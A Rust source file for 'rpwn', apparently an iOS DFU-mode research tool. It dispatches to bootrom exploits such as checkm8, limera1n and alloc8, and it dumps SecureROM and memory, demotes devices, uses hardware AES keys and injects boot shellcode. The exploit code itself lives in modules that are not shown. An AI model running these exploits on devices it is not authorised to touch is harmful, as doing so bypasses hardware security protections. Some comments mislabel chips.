//! RPWN: Rust DFU research and device tooling.
//! Author: axi0mX
//!
//! This binary is the Rust-native replacement for the legacy Python driver.

mod alloc8;
mod checkm8;
mod cli;
mod cm8;
mod device_platform;
mod dfu;
mod dfuexec;
mod image3;
mod image3_24kpwn;
mod libusb;
mod limera1n;
#[path = "payload.rs"]
mod measured_payload;
mod nor;
mod profile;
mod recovery;
mod shatter;
mod shellcode;
mod steaks4uce;
mod usbexec;
mod utilities;

#[cfg(test)]
mod tests;

use std::io::Write;

use dfuexec::PwnedDFUDevice;
use nor::NorData;
use shellcode::asm_arm64_branch;
use usbexec::{ExecArg, PwnedUSBDevice};
use utilities::{die, hex_dump, prompt, read_file, sha1_hex, slice, write_file};

fn print_help() {
    println!("USAGE: rpwn [options]");
    println!("Interact with an iOS device in DFU Mode.\n");
    println!("Basic options:");
    println!("  -p\t\t\t\tUSB exploit for pwned DFU Mode");
    println!("  -x\t\t\t\tinstall alloc8 exploit to NOR");
    println!("  -f file\t\t\tsend file to device in DFU Mode");
    println!("  --detect\t\tprint the attached device's DFU serial");
    println!("  --reach\t\tprint cpid= and reach= for the attached device");
    println!("Advanced options:");
    println!("  --demote\t\t\tdemote device to enable JTAG");
    println!("  --boot\t\t\tboot device");
    println!("  --dump=address,length\t\tdump memory to stdout");
    println!("  --hexdump=address,length\thexdump memory to stdout");
    println!("  --dump-rom\t\t\tdump SecureROM");
    println!("  --dump-nor=file\t\tdump NOR to file");
    println!("  --flash-nor=file\t\tflash NOR (header and firmware only) from file");
    println!("  --dump-ace2=file\t\tdump ACE2 firmware to file");
    println!("  --memory-map\t\t\tprint device memory map");
    println!("  --24kpwn\t\t\tinstall 24Kpwn exploit to NOR");
    println!("  --remove-24kpwn\t\tremove 24Kpwn exploit from NOR");
    println!("  --remove-alloc8\t\tremove alloc8 exploit from NOR");
    println!("  --decrypt-gid=hexdata\t\tAES decrypt with GID key");
    println!("  --encrypt-gid=hexdata\t\tAES encrypt with GID key");
    println!("  --decrypt-uid=hexdata\t\tAES decrypt with UID key");
    println!("  --encrypt-uid=hexdata\t\tAES encrypt with UID key");
}

fn main() {
    let argv: Vec<String> = std::env::args().skip(1).collect();

    let opts = match cli::getopt(&argv) {
        Ok(opts) => opts,
        Err(_) => {
            println!("ERROR: Invalid arguments provided.");
            print_help();
            std::process::exit(2);
        }
    };

    if opts.is_empty() {
        print_help();
        std::process::exit(2);
    }

    for (opt, arg) in opts {
        match opt.as_str() {
            "-p" => run_usb_exploit(),
            "-x" => install_alloc8(),
            "-f" => send_file(&arg),
            "--demote" => demote(),
            "--dump" => dump_memory(&arg),
            "--hexdump" => hexdump_memory(&arg),
            "--dump-rom" => dump_securerom(),
            "--dump-nor" => dump_nor(&arg),
            "--flash-nor" => flash_nor(&arg),
            "--dump-ace2" => dump_ace2(&arg),
            "--memory-map" => print_memory_map(),
            "--24kpwn" => install_24kpwn(),
            "--remove-24kpwn" => remove_24kpwn(),
            "--remove-alloc8" => remove_alloc8(),
            "--decrypt-gid" => aes_gid(&arg, dfuexec::AES_DECRYPT),
            "--encrypt-gid" => aes_gid(&arg, dfuexec::AES_ENCRYPT),
            "--decrypt-uid" => aes_uid(&arg, dfuexec::AES_DECRYPT),
            "--encrypt-uid" => aes_uid(&arg, dfuexec::AES_ENCRYPT),
            "--boot" => verbose_boot(),
            "--goat-run" => goat_run(&arg),
            "--goat-write" => goat_write(&arg),
            "--detect" => {
                let serial = PwnedDFUDevice::identifier();
                println!("{serial}");
            }
            "--reach" => {
                // The machine-readable half of --detect: a host tool that has
                // to route on reachability reads this rather than keeping its
                // own CPID lists, which is how `goat` came to disagree with the
                // dispatcher it calls.
                let serial = PwnedDFUDevice::identifier();
                let cpid = profile::parse_serial(&serial).cpid;
                let reach = profile::reach_for_serial(&serial);
                let token = match reach {
                    profile::Reach::Checkm8 => "checkm8",
                    profile::Reach::Usbliter8 => "usbliter8",
                    profile::Reach::Unsupported => "unsupported",
                };
                // key=value so a caller cannot mis-parse a bare token, and the
                // human line goes to stderr so stdout stays parseable even if
                // a future part has no CPID.
                eprintln!("{serial}");
                println!("cpid={}", cpid.map(|c| format!("0x{c:04x}")).unwrap_or_default());
                println!("reach={token}");
            }
            _ => unreachable!("unhandled option {}", opt),
        }
    }
}

fn goat_run(arg: &str) {
    let mut words = Vec::new();
    for raw in arg.split(',') {
        let value = match raw.trim().strip_prefix("0x").or(raw.trim().strip_prefix("0X")) {
            Some(x) => u64::from_str_radix(x, 16),
            None => raw.trim().parse::<u64>(),
        }.unwrap_or_else(|_| die(format!("ERROR: invalid execution word: {raw}")));
        words.extend_from_slice(&value.to_le_bytes());
    }
    let device = PwnedDFUDevice::new();
    device.execute(&words, 0);
}

fn goat_write(arg: &str) {
    let mut parts = arg.splitn(3, ',');
    let address = parts.next().and_then(|x| u64::from_str_radix(x.trim().trim_start_matches("0x"), 16).ok())
        .unwrap_or_else(|| die("ERROR: --goat-write address must be hexadecimal."));
    let path = parts.next().unwrap_or_else(|| die("ERROR: --goat-write needs address,file[,verify]."));
    let verify = parts.next().map(|x| x != "0" && x != "false").unwrap_or(true);
    let data = read_file(path).unwrap_or_else(|_| die(format!("ERROR: Could not read file: {path}")));
    let device = PwnedDFUDevice::new();
    for (offset, chunk) in data.chunks(0x1000).enumerate() {
        let at = address + (offset * 0x1000) as u64;
        device.write_memory(at, chunk);
        if verify {
            let got = device.read_memory(at, chunk.len());
            if got != chunk { die(format!("ERROR: Goat readback mismatch at 0x{at:x}.")); }
        }
    }
    println!("Goat wrote {} bytes at 0x{address:x}.", data.len());
}

// --- -p -------------------------------------------------------------------

/// `-p`: pick and run the USB exploit matching the connected device.
fn run_usb_exploit() {
    let serial_number = PwnedDFUDevice::identifier();

    // The measured Rust checkm8 path owns the A10/A11 profiles. It performs
    // the profile selection and refuses before touching USB when the trigger
    // point is not measured for the attached build.
    if serial_number.contains("CPID:8010") || serial_number.contains("CPID:8015") {
        cm8::exploit();
        return;
    }

    if serial_number.contains("CPID:8720") {
        steaks4uce::exploit();
    } else if serial_number.contains("CPID:8920") || serial_number.contains("CPID:8922") {
        limera1n::exploit();
    } else if serial_number.contains("CPID:8930") {
        shatter::exploit();
    } else if serial_number.contains("CPID:8947")
        || serial_number.contains("CPID:8950")
        || serial_number.contains("CPID:8955")
        || serial_number.contains("CPID:8960")
        || serial_number.contains("CPID:8002")
        || serial_number.contains("CPID:8004")
        || serial_number.contains("CPID:8011")
    {
        checkm8::exploit();
    } else {
        println!("Found: {}", serial_number);
        die("ERROR: This device is not supported.");
    }
}

// --- -x -------------------------------------------------------------------

/// `-x`: install the alloc8 exploit into NOR.
fn install_alloc8() {
    let device = PwnedDFUDevice::new();
    if device.config.cpid != "8920" {
        die("This is not a compatible device. alloc8 exploit is for iPhone 3GS only.");
    }

    if device.config.version == "359.3" {
        println!("WARNING: iPhone 3GS (old bootrom) was detected. Use 24Kpwn exploit for faster boots, alloc8 exploit is for testing purposes only.");
        prompt("Press ENTER to continue.");
    }

    println!("Installing alloc8 exploit to NOR.");

    let dump = device.nor_dump(true);
    let mut nor = NorData::new(&dump);

    if !nor.alloc8_area_is_empty() {
        die("ERROR: Bytes following IMG2 header in NOR are not zero. alloc8 exploit was likely previously installed. Exiting.");
    }
    if nor.images.is_empty() || nor.images[0].len() < 0x24000 {
        die("ERROR: 24Kpwn LLB was not found. You must restore a custom 24Kpwn IPSW before using this exploit.");
    }

    println!("Preparing modified NOR with alloc8 exploit.");
    // Remove 24Kpwn first.
    nor.images[0] = image3_24kpwn::remove_exploit(&nor.images[0], &device);
    let new_nor = alloc8::exploit(&nor, device.config.version);
    device.flash_nor(&new_nor.dump());
}

// --- -f -------------------------------------------------------------------

/// `-f <file>`: send an arbitrary image to a device in DFU Mode.
fn send_file(path: &str) {
    let data =
        read_file(path).unwrap_or_else(|_| die(format!("ERROR: Could not read file: {}", path)));

    let device = dfu::acquire_device();
    dfu::reset_counters(&device);
    dfu::send_data(&device, &data);
    dfu::request_image_validation(&device);
}

// --- --demote -------------------------------------------------------------

/// `--demote`: clear the JTAG disable bit on a checkm8-pwned device.
fn demote() {
    let serial_number = PwnedDFUDevice::identifier();

    if !serial_number.contains("PWND:[checkm8]") {
        die("ERROR: Demotion is only supported on devices pwned with checkm8 exploit.");
    }

    let pwned = PwnedUSBDevice::new();
    let demotion_reg = pwned.platform.demotion_reg;
    let old_value = pwned.read_memory_uint32(demotion_reg);
    println!("Demotion register: 0x{:x}", old_value);

    if old_value & 1 != 0 {
        println!("Attempting to demote device.");
        pwned.write_memory_uint32(demotion_reg, old_value & 0xFFFF_FFFE);
        let new_value = pwned.read_memory_uint32(demotion_reg);
        println!("Demotion register: 0x{:x}", new_value);
        if old_value != new_value {
            println!("Success!");
        } else {
            println!("Failed.");
        }
    } else {
        println!("WARNING: Device is already demoted.");
    }
}

// --- --dump / --hexdump ---------------------------------------------------

/// Parses the shared `address,length` argument. Hex when prefixed with `0x`, else decimal.
fn parse_address_length(arg: &str) -> (u64, usize) {
    if arg.matches(',').count() != 1 {
        die("ERROR: You must provide exactly 2 comma separated values: address,length");
    }
    let (raw_address, raw_length) = arg.split_once(',').unwrap();

    let parse = |raw: &str| -> u64 {
        let trimmed = raw.trim();
        let (digits, radix) = match trimmed.strip_prefix("0x").or(trimmed.strip_prefix("0X")) {
            Some(rest) => (rest, 16),
            None => (trimmed, 10),
        };
        match u64::from_str_radix(digits, radix) {
            Ok(value) => value,
            Err(_) => die(format!("ERROR: Could not parse value: {}", raw)),
        }
    };

    (parse(raw_address), parse(raw_length) as usize)
}

fn is_checkm8_pwned() -> bool {
    PwnedDFUDevice::identifier().contains("PWND:[checkm8]")
}

/// `--dump=address,length`
fn dump_memory(arg: &str) {
    let (address, length) = parse_address_length(arg);
    let mut stdout = std::io::stdout();

    if is_checkm8_pwned() {
        let device = PwnedUSBDevice::new();
        let _ = stdout.write_all(&device.read_memory(address, length));
    } else {
        let device = PwnedDFUDevice::new();
        let _ = stdout.write_all(&device.read_memory(address, length));
        println!();
    }
    let _ = stdout.flush();
}

/// `--hexdump=address,length`
fn hexdump_memory(arg: &str) {
    let (address, length) = parse_address_length(arg);

    if is_checkm8_pwned() {
        let device = PwnedUSBDevice::new();
        let dump = device.read_memory(address, length);
        let mut address = address;
        for line in hex_dump(&dump, address).lines() {
            println!("{:x}: {}", address, &line[10..]);
            address += 16;
        }
    } else {
        let device = PwnedDFUDevice::new();
        let dump = device.read_memory(address, length);
        // `print x,` in Python 2 emits the string, a space, then a newline.
        println!("{} ", hex_dump(&dump, address));
    }
}

// --- --dump-rom -----------------------------------------------------------

/// Splits on a NUL byte, like `str.split('\0')[0]`.
fn cstr_field(data: &[u8]) -> String {
    let end = data.iter().position(|&b| b == 0).unwrap_or(data.len());
    String::from_utf8_lossy(&data[..end]).into_owned()
}

/// `--dump-rom`
fn dump_securerom() {
    if is_checkm8_pwned() {
        let pwned = PwnedUSBDevice::new();
        let securerom =
            pwned.read_memory(pwned.platform.rom_base, pwned.platform.rom_size as usize);
        if sha1_hex(&securerom) != pwned.platform.rom_sha1 {
            println!("{}", sha1_hex(&securerom));
            die("ERROR: SecureROM was dumped, but the SHA1 hash does not match. Exiting.");
        }
        let chip = slice(&securerom, 0x200, 0x240)
            .split(|&b| b == b' ')
            .nth(2)
            .map(|part| String::from_utf8_lossy(&part[..part.len() - 1]).into_owned())
            .unwrap_or_default();
        let kind = cstr_field(&slice(&securerom, 0x240, 0x280));
        let version = cstr_field(&slice(&securerom, 0x280, 0x2C0));
        let version = version.chars().skip(6).collect::<String>();
        let filename = format!("SecureROM-{}-{}-{}.dump", chip, version, kind);
        write_file(&filename, &securerom).unwrap_or_else(|e| die(format!("ERROR: {}.", e)));
        println!("Saved: {}", filename);
    } else {
        let device = PwnedDFUDevice::new();
        let securerom = device.securerom_dump();
        let filename = format!("SecureROM-{}-RELEASE.dump", device.config.version);
        write_file(&filename, &securerom).unwrap_or_else(|e| die(format!("ERROR: {}.", e)));
        println!("SecureROM dumped to file: {}", filename);
    }
}

// --- NOR ------------------------------------------------------------------

/// Shared guard: refuses to touch NOR on anything but an iPhone 3GS.
fn require_ipad_3gs(cpid: &str, feature: &str) {
    if cpid != "8920" {
        die(format!("This is not a compatible device. {}", feature));
    }
}

/// `--dump-nor=file`
fn dump_nor(path: &str) {
    let device = PwnedDFUDevice::new();
    require_ipad_3gs(
        device.config.cpid,
        "Dumping NOR is only supported on iPhone 3GS.",
    );
    let dump = device.nor_dump(false);
    write_file(path, &dump).unwrap_or_else(|e| die(format!("ERROR: {}.", e)));
    println!("NOR dumped to file: {}", path);
}

/// `--flash-nor=file`
fn flash_nor(path: &str) {
    println!("Flashing NOR from file: {}", path);
    let new_nor =
        read_file(path).unwrap_or_else(|_| die(format!("ERROR: Could not read file: {}", path)));
    if new_nor.len() < 4 || &new_nor[..4] != b"2GMI" {
        die("ERROR: Bad IMG2 header magic. This is not a valid NOR. Exiting.");
    }

    let device = PwnedDFUDevice::new();
    require_ipad_3gs(
        device.config.cpid,
        "Flashing NOR is only supported on iPhone 3GS.",
    );
    device.nor_dump(true);
    device.flash_nor(&new_nor);
}

/// `--dump-ace2=file`
fn dump_ace2(path: &str) {
    let serial = PwnedDFUDevice::identifier();

    // ACE2 exists on T8020 (iPhone XS/XR), T8027 (iPhone XS Max), T8030 (iPhone 11)
    // CPID 0x8020, 0x8027, 0x8030
    let is_supported = serial.contains("CPID:8020")
        || serial.contains("CPID:8027")
        || serial.contains("CPID:8030");

    if !is_supported {
        println!("{}", serial);
        die("ERROR: ACE2 dump is only supported on T8020/T8027/T8030 (iPhone XS/XR/11 series).");
    }

    println!("Dumping ACE2 firmware...");

    let device = PwnedDFUDevice::new();

    // ACE2 firmware base addresses (from device_platform and SecureROM analysis)
    // These are the AP-side addresses where ACE2 firmware is loaded
    let (ace2_base, ace2_size) = if serial.contains("CPID:8020") {
        // T8020 - iPhone XS/XR
        (0x1801B0000u64, 0x40000u32) // From device_platform: sram_base + offset
    } else if serial.contains("CPID:8027") {
        // T8027 - iPhone XS Max (A12X)
        (0x19C000000u64, 0x80000u32) // T8027 boot scratch area
    } else {
        // T8030 - iPhone 11 (A13)
        (0x19C000000u64, 0x80000u32)
    };

    println!("ACE2 base: 0x{:X}, size: 0x{:X}", ace2_base, ace2_size);

    // Dump the ACE2 firmware region
    let dump = device.read_memory(ace2_base, ace2_size as usize);

    // Verify it's valid (check for ARM64 magic or known patterns)
    if dump.len() >= 4 {
        let magic = u32::from_le_bytes([dump[0], dump[1], dump[2], dump[3]]);
        println!("ACE2 magic: 0x{:08X}", magic);
    }

    write_file(path, &dump).unwrap_or_else(|e| die(format!("ERROR: {}.", e)));
    println!("ACE2 firmware dumped to: {} ({} bytes)", path, dump.len());
}

/// `--memory-map`
fn print_memory_map() {
    let serial = PwnedDFUDevice::identifier();
    println!("{}", serial);

    // Determine platform from serial
    let cpid = if serial.contains("CPID:8920") {
        "8920"
    } else if serial.contains("CPID:8922") {
        "8922"
    } else if serial.contains("CPID:8930") {
        "8930"
    } else if serial.contains("CPID:8947") {
        "8947"
    } else if serial.contains("CPID:8950") {
        "8950"
    } else if serial.contains("CPID:8955") {
        "8955"
    } else if serial.contains("CPID:8960") {
        "8960"
    } else if serial.contains("CPID:8002") {
        "8002"
    } else if serial.contains("CPID:8004") {
        "8004"
    } else if serial.contains("CPID:8010") {
        "8010"
    } else if serial.contains("CPID:8011") {
        "8011"
    } else if serial.contains("CPID:8015") {
        "8015"
    } else if serial.contains("CPID:8020") {
        "8020"
    } else if serial.contains("CPID:8027") {
        "8027"
    } else if serial.contains("CPID:8030") {
        "8030"
    } else if serial.contains("CPID:8720") {
        "8720"
    } else {
        "unknown"
    };

    println!("\n=== Memory Map (CPID: {}) ===", cpid);

    // Known regions (from SecureROM analysis and device_platform.rs)
    println!("\n--- Known Regions ---");
    match cpid {
        "8015" => {
            // T8015 - iPhone X (A11)
            println!("  Boot ROM:      0x1000_00000 - 0x1001_00000  (1 MB)");
            println!("  SRAM:          0x1800_00000 - 0x1800_20000  (128 KB)");
            println!("  Heap:          0x1800_E8000 - 0x1801_00000");
            println!("  Boot Args:     0x1801_80000");
            println!("  Trampoline:    0x1800_18000");
            println!("  DFU Notify:    0x1000_098B4");
            println!("  NAND Boot:     0x1000_0188C");
            println!("  Demotion Reg:  0x2352_BC000");
        }
        "8020" => {
            // T8020 - iPhone XS/XR (A12)
            println!("  Boot ROM:      0x1000_00000 - 0x1001_00000  (1 MB)");
            println!("  SRAM:          0x1800_00000 - 0x1800_20000  (128 KB)");
            println!("  ACE2:          0x1801_B0000 - 0x1801_F0000  (256 KB)");
            println!("  Demotion Reg:  0x2352_BC000 (T8020) / 0x2352_BC000");
        }
        "8027" => {
            // T8027 - iPhone XS Max (A12X)
            println!("  Boot ROM:      0x1000_00000 - 0x1001_00000  (1 MB)");
            println!("  Boot Scratch:  0x19C0_00000 - 0x19C0_40000  (256 KB)");
            println!("  ACE2:          0x19C0_00000 - 0x19C0_80000  (512 KB)");
            println!("  Demotion Reg:  0x2352_BC000");
        }
        "8030" => {
            // T8030 - iPhone 11 (A13)
            println!("  Boot ROM:      0x1000_00000 - 0x1001_00000  (1 MB)");
            println!("  Boot Scratch:  0x19C0_00000 - 0x19C0_40000  (256 KB)");
            println!("  ACE2:          0x19C0_00000 - 0x19C0_80000  (512 KB)");
            println!("  Demotion Reg:  0x2352_BC000");
        }
        "8010" | "8011" => {
            // T8010/T8011 - iPhone 8/8 Plus (A11)
            println!("  Boot ROM:      0x1000_00000 - 0x1001_00000  (1 MB)");
            println!("  SRAM:          0x1800_00000 - 0x1800_20000  (128 KB)");
            println!("  Demotion Reg:  0x2102_BC000");
        }
        "8002" | "8004" => {
            // T8002/T8004 - Apple Watch S3 (A7)
            println!("  Boot ROM:      0x4000_0000 - 0x4010_0000  (1 MB)");
            println!("  SRAM:          0x4880_0000 - 0x4892_0000  (1152 KB)");
            println!("  Demotion Reg:  0x481B_C000");
        }
        "8960" => {
            // S5L8960 - iPhone 5s (A7)
            println!("  Boot ROM:      0x1000_00000 - 0x1000_80000  (512 KB)");
            println!("  SRAM:          0x1800_00000 - 0x1804_00000  (4 MB)");
            println!("  Demotion Reg:  0x20E0_2A000");
        }
        "8947" | "8950" | "8955" => {
            // A8-A9
            println!("  Boot ROM:      0x3F00_0000 - 0x3F01_0000  (64 KB)");
            println!("  SRAM:          0x1000_0000 - 0x1080_0000  (8 MB)");
            println!("  Demotion Reg:  0x3F50_0000");
        }
        "8920" | "8922" | "8930" => {
            // A5-A6
            println!("  Boot ROM:      0xBF00_0000 - 0xBF01_0000  (64 KB)");
            println!("  SRAM:          0x8400_0000 - 0x8500_0000  (16 MB)");
            println!("  Demotion Reg:  0x3F50_0000");
        }
        "8720" => {
            // iPod Touch 2G
            println!("  Boot ROM:      0xBF00_0000 - 0xBF01_0000");
            println!("  SRAM:          0x8400_0000 - 0x8500_0000");
        }
        _ => {
            println!("  (No detailed map for CPID: {})", cpid);
        }
    }

    // DRAM base for all modern devices
    if !matches!(
        cpid,
        "8920" | "8922" | "8930" | "8947" | "8950" | "8955" | "8960" | "8720"
    ) {
        println!("\n  DRAM Base:     0x8000_00000  (2 TB boundary)");
    }

    println!("\n=== End Memory Map ===");
}

/// `--24kpwn`
fn install_24kpwn() {
    println!("*** based on 24Kpwn exploit (segment overflow) by chronic, CPICH, ius, MuscleNerd, Planetbeing, pod2g, posixninja, et al. ***");

    let device = PwnedDFUDevice::new();
    if device.config.version != "359.3" {
        die("Only iPhone 3GS (old bootrom) is supported.");
    }

    let dump = device.nor_dump(true);

    println!("Preparing modified NOR with 24Kpwn exploit.");
    let mut nor = NorData::new(&dump);

    if !nor.alloc8_area_is_empty() {
        die("ERROR: Bytes following IMG2 header in NOR are not zero. alloc8 exploit was likely previously installed. Exiting.");
    }
    if nor.images.is_empty() {
        die("ERROR: 24Kpwn exploit cannot be installed, because NOR has no valid LLB. Exiting.");
    }

    // Remove any existing 24Kpwn exploit.
    if nor.images[0].len() > 0x24000 {
        nor.images[0] = image3_24kpwn::remove_exploit(&nor.images[0], &device);
    }
    let securerom = device.securerom_dump();
    nor.images[0] = image3_24kpwn::exploit(&nor.images[0], &securerom);
    device.flash_nor(&nor.dump());
}

/// `--remove-24kpwn`
fn remove_24kpwn() {
    let device = PwnedDFUDevice::new();
    if device.config.cpid != "8920" {
        die("This is not a compatible device. 24Kpwn exploit is only supported on iPhone 3GS.");
    }

    println!("WARNING: This feature is for researchers only. Device will probably not boot into iOS until it is restored in iTunes.");
    prompt("Press ENTER to continue.");

    let dump = device.nor_dump(true);
    let mut nor = NorData::new(&dump);

    if nor.images.is_empty() {
        die("ERROR: NOR has no valid LLB. It seems that 24Kpwn exploit is not installed. Exiting.");
    }
    if nor.images[0].len() <= 0x24000 {
        die("ERROR: LLB is not oversized. It seems that 24Kpwn exploit is not installed. Exiting.");
    }

    println!("Preparing modified NOR without 24Kpwn exploit.");
    nor.images[0] = image3_24kpwn::remove_exploit(&nor.images[0], &device);
    device.flash_nor(&nor.dump());
}

/// `--remove-alloc8`
fn remove_alloc8() {
    let device = PwnedDFUDevice::new();
    if device.config.cpid != "8920" {
        die("This is not a compatible device. alloc8 exploit is for iPhone 3GS only.");
    }

    println!("WARNING: This feature is for researchers only. Device will probably not boot into iOS until it is restored in iTunes.");
    prompt("Press ENTER to continue.");

    let dump = device.nor_dump(true);
    let nor = NorData::new(&dump);

    if nor.images.len() < 700 {
        die("ERROR: It seems that alloc8 exploit is not installed. There are less than 700 images in NOR. Exiting.");
    }

    println!("Preparing modified NOR without alloc8 exploit.");
    let new_nor = alloc8::remove_exploit(&nor);
    device.flash_nor(&new_nor.dump());
}

// --- AES ------------------------------------------------------------------

/// `--decrypt-gid` / `--encrypt-gid`
fn aes_gid(hexdata: &str, action: u32) {
    if is_checkm8_pwned() {
        let pwned = PwnedUSBDevice::new();
        let verb = if action == dfuexec::AES_ENCRYPT {
            "Encrypting"
        } else {
            "Decrypting"
        };
        println!("{} with {} GID key.", verb, pwned.platform.name());
        println!("{}", pwned.aes_hex(hexdata, action, usbexec::AES_GID_KEY));
    } else {
        let device = PwnedDFUDevice::new();
        let verb = if action == dfuexec::AES_ENCRYPT {
            "Encrypting"
        } else {
            "Decrypting"
        };
        println!("{} with S5L{} GID key.", verb, device.config.cpid);
        println!("{}", device.aes_hex(hexdata, action, dfuexec::AES_GID_KEY));
    }
}

/// `--decrypt-uid` / `--encrypt-uid`
fn aes_uid(hexdata: &str, action: u32) {
    let verb = if action == dfuexec::AES_ENCRYPT {
        "Encrypting"
    } else {
        "Decrypting"
    };
    if is_checkm8_pwned() {
        let pwned = PwnedUSBDevice::new();
        println!(
            "{} with {} device-specific UID key.",
            verb,
            pwned.platform.name()
        );
        println!("{}", pwned.aes_hex(hexdata, action, usbexec::AES_UID_KEY));
    } else {
        let device = PwnedDFUDevice::new();
        println!("{} with device-specific UID key.", verb);
        println!("{}", device.aes_hex(hexdata, action, dfuexec::AES_UID_KEY));
    }
}

// --- --boot ---------------------------------------------------------------

/// `--boot`: repair the heap and hand control to NAND boot on iPhone X.
fn verbose_boot() {
    const HEAP_BASE: u64 = 0x1801_E8000;
    const HEAP_WRITE_OFFSET: u64 = 0x5000;
    const HEAP_WRITE_HASH: u64 = 0x1000_0D4EC;
    const HEAP_CHECK_ALL: u64 = 0x1000_0DB98;
    const HEAP_STATE: u64 = 0x1800_086A0;
    const NAND_BOOT_JUMP: u64 = 0x1000_0188C;
    const BOOTSTRAP_TASK_LR: u64 = 0x1800_15F88;
    const DFU_BOOL: u64 = 0x1800_085B0;
    const DFU_NOTIFY: u64 = 0x1000_098B4;
    const DFU_STATE: u64 = 0x1800_085E0;
    const TRAMPOLINE: u64 = 0x1800_18000;

    let serial_number = PwnedDFUDevice::identifier();
    if !serial_number.contains("CPID:8015") || !serial_number.contains("PWND:[checkm8]") {
        println!("{}", serial_number);
        println!(
            "ERROR: Option --boot is currently only supported on iPhone X pwned with checkm8."
        );
        return;
    }

    let device = PwnedUSBDevice::new();

    // struct.pack('<8Q', ...)
    let block1 = [0u64, 0, 0, HEAP_STATE, 2, 132, 128, 0];
    let block2 = [0u64, 0, 0, HEAP_STATE, 2, 8, 128, 0];

    let write_block = |offset: u64, block: &[u64; 8]| {
        let bytes: Vec<u8> = block.iter().flat_map(|v| v.to_le_bytes()).collect();
        device.write_memory(HEAP_BASE + HEAP_WRITE_OFFSET + offset, &bytes);
    };

    write_block(0x000, &block1);
    write_block(0x080, &block2);
    write_block(0x100, &block2);
    write_block(0x180, &block2);

    for offset in [0x000u64, 0x080, 0x100, 0x180] {
        device.execute(
            0,
            &[
                ExecArg::Word(HEAP_WRITE_HASH),
                ExecArg::Word(HEAP_BASE + HEAP_WRITE_OFFSET + offset),
            ],
        );
    }
    device.execute(0, &[ExecArg::Word(HEAP_CHECK_ALL)]);
    println!("Heap repaired.");

    device.write_memory(
        TRAMPOLINE,
        &asm_arm64_branch(TRAMPOLINE, TRAMPOLINE + 0x400),
    );
    device.write_memory(TRAMPOLINE + 0x400, shellcode::T8015_SHELLCODE_ARM64);

    device.write_memory_ptr(BOOTSTRAP_TASK_LR, NAND_BOOT_JUMP);
    device.write_memory_uint8(DFU_BOOL, 1);
    device.execute(0, &[ExecArg::Word(DFU_NOTIFY), ExecArg::Word(DFU_STATE)]);
    println!("Booted.");
}
